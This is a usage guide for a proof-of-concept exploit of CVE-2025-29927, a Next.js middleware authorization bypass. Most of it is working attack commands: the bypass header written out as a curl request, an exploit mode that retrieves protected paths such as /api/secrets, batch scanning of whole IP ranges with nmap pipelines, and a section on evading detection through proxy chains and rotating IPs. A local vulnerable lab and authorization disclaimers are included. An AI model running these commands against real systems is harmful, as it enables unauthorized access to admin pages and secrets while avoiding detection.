# CVE-2025-29927 Usage Guide

## Quick Start

### Installation

```bash
# Clone the repository
git clone https://github.com/hujiaozhuzhu/CVE-2025-29927-POC.git
cd CVE-2025-29927-POC

# Install Python dependencies
pip install -r requirements.txt
```

### Single Target Testing

```bash
python exploit/cve_2025_29927.py -u http://localhost:3000
```

### Batch Scanning

```bash
# Scan targets from file
python exploit/batch_scanner.py -f targets.txt

# Scan IP range
python exploit/batch_scanner.py --range 192.168.1.0-255
```

## Detailed Usage

### Basic Exploitation

Test a single target with the default admin path:

```bash
python exploit/cve_2025_29927.py -u http://target.com
```

**Expected Output**:
```
╔══════════════════════════════════════════════════════════╗
║                                                            ║
║   CVE-2025-29927 Next.js Middleware Authorization Bypass    ║
║                                                            ║
║   LEGAL: Authorized testing ONLY!                     ║
║                                                            ║
╚══════════════════════════════════════════════════════════╝

Target: http://target.com
Mode: Detection
Verbose: False

[+] 正在测试目标: http://target.com/admin
[+] 构造绕过请求头: {'x-middleware-subrequest': '1', ...}
[+] 第一步：正常请求（无漏洞头，验证拦截）
[+] 正常请求被拦截，状态码: 302，环境正常
[+] 第二步：漏洞利用请求（带x-middleware-subrequest头）
[+] 漏洞利用成功！状态码: 200
[+] 成功访问管理员页面，页面长度: 12580 字节
```

### Advanced Options

#### Custom Path Testing

Test a specific protected path:

```bash
python exploit/cve_2025_29927.py -u http://target.com -p /api/config
```

#### Verbose Mode

Enable detailed output for debugging:

```bash
python exploit/cve_2025_29927.py -u http://target.com -v
```

#### Exploitation Mode

Attempt to retrieve content from protected path:

```bash
python exploit/cve_2025_29927.py -u http://target.com --exploit
```

#### Auto-Scan

Automatically test common protected paths:

```bash
python exploit/cve_2025_29927.py -u http://target.com --auto-scan
```

**Tested Paths**:
- `/admin`
- `/dashboard`
- `/settings`
- `/api/admin`
- `/api/users`
- `/api/config`
- `/api/secrets`
- `/private`
- `/config`

#### Custom Paths File

Test paths from a file:

```bash
# Create paths.txt
cat > paths.txt << EOF
/admin
/api/admin
/dashboard
/management
/secret
EOF

# Run exploit
python exploit/cve_2025_29927.py -u http://target.com --paths paths.txt
```

### Output to File

Save scan results to a file:

```bash
python exploit/cve_2025_29927.py -u http://target.com --auto-scan -o results.txt
```

## Batch Scanner Usage

### Scan from File

Create a file with target URLs:

```bash
cat > targets.txt << EOF
http://192.168.1.10:3000
http://192.168.1.11:3000
http://192.168.1.12:3000
http://10.0.0.5:3000
EOF
```

Run batch scan:

```bash
python exploit/batch_scanner.py -f targets.txt
```

### Scan IP Range

#### Range Format (CIDR)

```bash
# Scan entire /24 network
python exploit/batch_scanner.py --range 192.168.1.0/24
```

#### Range Format (Start-End)

```bash
# Scan specific IP range
python exploit/batch_scanner.py --range 192.168.1.100-200
```

### Custom Port

Scan targets on a non-default port:

```bash
python exploit/batch_scanner.py --range 192.168.1.0/24 --port 8080
```

### Control Thread Count

Adjust concurrent threads for performance:

```bash
# Fast scan (more threads)
python exploit/batch_scanner.py -f targets.txt --threads 20

# Slow scan (fewer threads)
python exploit/batch_scanner.py -f targets.txt --threads 5
```

### Save Results

Save batch scan results to JSON:

```bash
python exploit/batch_scanner.py -f targets.txt -o scan_results.json
```

**JSON Output Format**:
```json
[
  {
    "url": "http://192.168.1.10:3000",
    "vulnerable": true,
    "normal_status": 302,
    "exploit_status": 200,
    "response_length": 12580,
    "has_admin_content": true
  },
  {
    "url": "http://192.168.1.11:3000",
    "vulnerable": false,
    "normal_status": 404,
    "exploit_status": 404,
    "response_length": 0,
    "has_admin_content": false
  }
]
```

## Vulnerable Environment Setup

### Using Docker (Recommended)

```bash
cd target
docker-compose up -d
```

The vulnerable application will be available at `http://localhost:3000`

### Manual Setup

```bash
cd target
npm install
npm run dev
```

### Verify Environment

1. **Normal Access (Should be blocked)**:
   ```bash
   curl -I http://localhost:3000/admin
   # Expected: 302, 401, or 403
   ```

2. **Exploit Access (Should succeed)**:
   ```bash
   curl -H "x-middleware-subrequest: 1" http://localhost:3000/admin
   # Expected: 200 OK with admin content
   ```

## Troubleshooting

### Issue: "No targets to scan"

**Cause**: Empty or non-existent target file

**Solution**:
```bash
# Verify file exists
cat targets.txt

# Or use range scanning
python exploit/batch_scanner.py --range 192.168.1.0/24
```

### Issue: "Timeout while testing"

**Cause**: Target is unreachable or firewall blocking

**Solution**:
- Verify target is running
- Check network connectivity
- Increase timeout: `--timeout 30`

### Issue: "Not vulnerable on path"

**Cause**: Target is patched or path doesn't exist

**Solution**:
- Verify target Next.js version: `curl -I http://target.com | grep x-powered-by`
- Try different paths: `--auto-scan`
- Check if middleware is implemented

### Issue: Docker container won't start

**Cause**: Port 3000 already in use

**Solution**:
```bash
# Check what's using port 3000
lsof -i :3000

# Kill process or use different port
docker-compose down
# Edit docker-compose.yml to use different port
docker-compose up -d
```

## Best Practices

### 1. Ethical Testing

- Only test systems you own or have permission to test
- Document all test activities
- Report vulnerabilities responsibly
- Follow responsible disclosure guidelines

### 2. Testing Methodology

1. **Reconnaissance**: Identify Next.js applications
2. **Version Detection**: Check if running vulnerable version
3. **Path Enumeration**: Find protected routes
4. **Vulnerability Testing**: Test with exploit
5. **Impact Assessment**: Evaluate potential damage
6. **Reporting**: Document and report findings

### 3. Detection Evasion

**Note**: This is for educational purposes only. Always obtain proper authorization.

- Randomize User-Agent strings
- Use proxy chains
- Implement request delays
- Rotate source IPs

### 4. Performance Optimization

- Use batch scanning for multiple targets
- Adjust thread count based on network capacity
- Cache results to avoid redundant scans
- Use IP range scanning for large networks

## Example Scenarios

### Scenario 1: Single Target Assessment

```bash
# 1. Test main admin path
python exploit/cve_2025_29927.py -u http://internal-app:3000

# 2. Auto-scan for other protected paths
python exploit/cve_2025_29927.py -u http://internal-app:3000 --auto-scan

# 3. Exploit and retrieve content
python exploit/cve_2025_29927.py -u http://internal-app:3000 --exploit -p /api/config
```

### Scenario 2: Network Security Audit

```bash
# 1. Scan entire network
python exploit/batch_scanner.py --range 10.0.0.0/24

# 2. Save results for analysis
python exploit/batch_scanner.py --range 10.0.0.0/24 -o audit_results.json

# 3. Follow up on vulnerable hosts
python exploit/cve_2025_29927.py -u http://10.0.0.15:3000 --auto-scan
```

### Scenario 3: Penetration Testing

```bash
# 1. Test from file of discovered targets
python exploit/batch_scanner.py -f pentest_targets.txt --threads 5

# 2. Detailed testing of vulnerable targets
while read url; do
  python exploit/cve_2025_29927.py -u "$url" --auto-scan -o "results/$(basename $url).txt"
done < vuln_targets.txt
```

## Integration with Other Tools

### Combine with Nmap

```bash
# Find Next.js applications on network
nmap -p 3000 --open 192.168.1.0/24 -oG -

# Extract IPs and test
grep "3000/open" nmap_results.txt | awk '{print "http://"$2":3000"}' > targets.txt
python exploit/batch_scanner.py -f targets.txt
```

### Automate with Bash

```bash
#!/bin/bash
# auto_scan.sh - Automated CVE-2025-29927 scanning

NETWORK=$1
OUTPUT_DIR="results_$(date +%Y%m%d_%H%M%S)"

mkdir -p "$OUTPUT_DIR"

echo "Scanning $NETWORK..."
python exploit/batch_scanner.py --range "$NETWORK" -o "$OUTPUT_DIR/scan.json"

echo "Detailed testing of vulnerable targets..."
jq -r '.[] | select(.vulnerable) | .url' "$OUTPUT_DIR/scan.json" | while read url; do
  echo "Testing $url..."
  python exploit/cve_2025_29927.py -u "$url" --auto-scan -o "$OUTPUT_DIR/$(basename $url).txt"
done

echo "Results saved to $OUTPUT_DIR"
```

### CI/CD Integration

```yaml
# .github/workflows/security-scan.yml
name: CVE-2025-29927 Scan

on:
  schedule:
    - cron: '0 0 * * 0'  # Weekly scan

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Run vulnerability scan
        run: |
          pip install -r requirements.txt
          python exploit/batch_scanner.py -f targets.txt -o results.json
      - name: Upload results
        uses: actions/upload-artifact@v2
        with:
          name: scan-results
          path: results.json
```

## Support

For additional help or questions:
- Check the main [README.md](../README.md)
- Review [vuln_analysis.md](vuln_analysis.md) for technical details
- Consult [defense.md](defense.md) for mitigation strategies

---

**Remember**: Always test responsibly and obtain proper authorization before scanning.
